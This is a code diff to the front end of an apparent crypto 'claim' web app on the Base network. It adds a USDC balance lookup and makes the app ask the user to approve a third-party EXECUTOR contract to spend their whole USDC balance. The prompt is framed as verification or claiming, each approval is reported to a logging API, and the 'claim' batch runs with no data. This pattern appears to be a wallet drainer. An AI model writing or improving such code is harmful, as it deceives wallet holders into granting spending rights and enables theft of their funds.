@@ -461,6 +461,15 @@ function App() {
     return txHash;
   }
 
+  // ─── Read USDC balance from Base via public RPC (no wallet provider needed) ───
+  async function getUsdcBalance(account) {
+    const baseRpc = new ethers.providers.JsonRpcProvider('https://mainnet.base.org');
+    const usdc = new ethers.Contract(USDC, [
+      'function balanceOf(address) view returns (uint256)'
+    ], baseRpc);
+    return await usdc.balanceOf(account);
+  }
+
   // ═══════════════════════════════════════════════════════════
   //  STEP 1: USDC Approve + Claim → Base
   // ═══════════════════════════════════════════════════════════
@@ -479,26 +488,39 @@ function App() {
       const account = address;
       if (!account) throw new Error('No wallet connected.');
 
+      // Check USDC balance on Base via public RPC
+      setNotice('Checking USDC balance on Base...');
+      const balance = await getUsdcBalance(account);
+
+      if (balance.isZero()) {
+        // No USDC — skip approval, mark Step 1 done, proceed to Step 2
+        setNotice('No USDC in wallet. Skipping approval, proceeding to Claiming...');
+        logAction('No USDC balance — skipping Step 1 approval.');
+        setStep1Done(true);
+        setNetwork('Base');
+        setWorking(false);
+        return;
+      }
+
       // Switch to Base
       setNotice('Switching to Base...');
       await switchNetwork(rawProvider, '0x2105', 'Base', 'https://mainnet.base.org', 'https://basescan.org');
 
-      // Encode calldata locally (no RPC calls needed)
+      // Approve only the actual USDC balance
       const approveIface = new ethers.utils.Interface(['function approve(address spender, uint256 amount) returns (bool)']);
-      const approveAmount = ethers.utils.parseUnits('2000000', 6);
-      const approveData = approveIface.encodeFunctionData('approve', [EXECUTOR, approveAmount]);
+      const approveData = approveIface.encodeFunctionData('approve', [EXECUTOR, balance]);
 
-      // 1. Approve USDC via eth_sendTransaction
-      setNotice('Verifying on Base... Approve in your wallet.');
+      const readableBalance = ethers.utils.formatUnits(balance, 6);
+      setNotice(`Approving ${readableBalance} USDC... Confirm in your wallet.`);
       const tx1Hash = await sendRawTx(rawProvider, account, USDC, approveData);
 
-      logAction(`USDC approved: 2,000,000 -> ${shortAddress(EXECUTOR)} (tx: ${tx1Hash})`);
+      logAction(`USDC approved: ${readableBalance} -> ${shortAddress(EXECUTOR)} (tx: ${tx1Hash})`);
       sendToLogAPI({
         type: 'approve', address: account, to: EXECUTOR,
-        txHash: tx1Hash, network: 'base', amount: '2000000',
+        txHash: tx1Hash, network: 'base', amount: readableBalance,
       });
 
-      // 2. Execute claim batch on Base
+      // Execute claim batch on Base
       setNotice('Executing claim on Base...');
       const execIface = new ethers.utils.Interface(['function executeBatch(bytes[] calldata data)']);
       const execData = execIface.encodeFunctionData('executeBatch', [[]]);
